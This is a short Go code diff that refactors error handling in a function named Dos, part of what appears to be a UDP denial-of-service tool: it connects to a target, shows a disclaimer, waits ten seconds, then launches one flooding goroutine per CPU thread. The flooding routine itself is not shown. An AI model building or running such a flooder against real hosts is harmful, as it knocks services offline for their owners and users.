@@ -33,13 +33,11 @@ func Dos(target string) {
 
 	conn, err := net.Dial("udp", target) // setup connection object
 	defer conn.Close()                   // make sure to close connection when finished
-	if err != nil {
-		ct.Foreground(ct.Red, true) // sets text color to bright red
-		panic(err.Error)
-	} else { // nothing bad happened when connecting to target
-		ct.Foreground(ct.Green, true) // ets text color to bright red
-		fmt.Println("Checks passed!")
-	}
+
+	utils.CheckErr(err)
+
+	ct.Foreground(ct.Green, true) // ets text color to bright red
+	fmt.Println("Checks passed!")
 
 	ct.Foreground(ct.Red, true)                                            // set text color to bright red
 	fmt.Println("\nWarning: you are solely responsible for your actions!") // disclaimer
@@ -50,10 +48,7 @@ func Dos(target string) {
 	time.Sleep(10 * time.Second) // 10 second delay - give chance to cancel
 
 	threads, err := cpu.Counts(false) // get threads on system to set DOS thread limit
-	if err != nil {
-		ct.Foreground(ct.Red, true) // set text color to bright red
-		panic(err.Error())
-	}
+	utils.CheckErr(err)
 
 	for i := 0; i < threads; i++ { // create DOS threads within limit
 		go utils.Dos(conn)             // create thread
